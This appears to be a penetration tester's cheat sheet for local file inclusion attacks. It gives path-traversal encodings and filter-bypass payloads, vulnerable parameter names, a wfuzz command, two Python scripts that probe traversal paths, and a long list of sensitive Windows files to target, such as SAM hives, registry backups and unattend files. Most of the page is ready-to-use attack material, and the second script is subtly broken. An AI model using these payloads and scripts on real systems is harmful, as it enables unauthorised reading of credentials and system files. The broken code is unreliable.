## Traversal encoding:
Remember this is a guide to ideas of how to encode lfi, encoding payloads on the fly not from here.
```
../
..\
..\/
../etc/passwd\.\	# Path and dot truncation
../etc/passwd/./
%2e%2e%2f
%252e%252e%252f 	# Double encoding
%c0%ae%c0%ae%c0%af	# utf-8 encoding
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
....\
%00					# null byte
....////			# filter bypass
/%5C../%5C..

```

## Cheatsheets
[certcube](https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/)

## Wrappers 


## Parametres
[Hacktricks reference TR Bug Hunters](https://twitter.com/trbughunters/status/1279768631845494787)
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

## wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ

## Script LFI starting 
ON TODO LIST
[rapid7 blog](https://www.rapid7.com/blog/post/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/)

```python
import requests
import webbrowser
 
 
url = 'http://www.testpage.com?page='
 
LFI = '../../../../../../../../../'
 
pages = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
 
for x in pages:
                  check = requests.get(url + LFI + x)
                  if check.status_code == 200:
                                    webbrowser.open(url + LFI + x)

import requests
import webbrowser
 
 
url = 'http://www.testpage.com?page='
 
LFI = '../../../../../../../../../'
 
usernames = ['bob.jones', 'tom.johnson', 'mary.thomas', 'bill.smith']
 
desktopini = '/Desktop/desktop.ini'
 
usersfiles = ['accounts.txt', 'passwords.doc', 'configs.txt', 'sensitiveinfo.doc']
 
for x in usernames:
                  check = requests.get(url + LFI + x + desktopini)
                  if check.status_code == 200:
                                    print(‘User ’ + x + ‘was found’)
                                    desktopsearch = requests.get(url + LFI + '/Desktop/' + usersfiles)
                                    if desktopsearch.status_code == 200:
                                                      webbrowser.open(url + LFI + '/Desktop/' + usersfiles)
```
						
## File paths 


Windows File paths
```
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log 
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err 
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log 
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf 
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf 
C:/Program Files (x86)/Apache Group/Apache/conf/access.log 
C:/Program Files (x86)/Apache Group/Apache/conf/error.log 
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml 
C:/Program Files (x86)/xampp/apache/conf/httpd.conf 
C:/WINDOWS/php.ini 
C:/WINDOWS/Repair/SAM 
C:/Windows/repair/system 
C:/Windows/repair/software 
C:/Windows/repair/security 
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini 
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log 
C:/xampp/apache/logs/error.log 
C:/Windows/Panther/Unattend/Unattended.xml 
C:/Windows/Panther/Unattended.xml 
C:/Windows/debug/NetSetup.log 
C:/Windows/system32/config/AppEvent.Evt 
C:/Windows/system32/config/SecEvent.Evt 
C:/Windows/system32/config/default.sav 
C:/Windows/system32/config/security.sav 
C:/Windows/system32/config/software.sav 
C:/Windows/system32/config/system.sav 
C:/Windows/system32/config/regback/default 
C:/Windows/system32/config/regback/sam 
C:/Windows/system32/config/regback/security 
C:/Windows/system32/config/regback/system 
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini 
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml 
C:/Windows/System32/inetsrv/config/applicationHost.config 
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log

```

## References
[certcube](https://blog.certcube.com/detailed-cheatsheet-lfi-rce-websheels/)
[Kory Kyzar](https://gist.github.com/korrosivesec)
[rapid7](https://www.rapid7.com/blog/post/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/)